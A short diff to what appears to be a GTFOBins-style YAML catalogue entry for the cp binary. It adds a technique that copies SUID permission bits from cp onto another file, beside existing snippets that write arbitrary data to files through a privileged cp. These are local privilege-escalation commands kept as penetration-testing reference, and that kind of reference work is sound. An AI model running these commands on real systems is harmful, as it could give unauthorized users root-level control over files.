@@ -18,6 +18,10 @@ functions:
         TF=$(mktemp)
         echo "DATA" > $TF
         ./cp $TF $LFILE
+    - description: This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.
+      code: |
+        LFILE=file_to_change
+        ./cp --attributes-only --preserve=all ./cp "$LFILE"
   sudo:
     - code: |
         LFILE=file_to_write
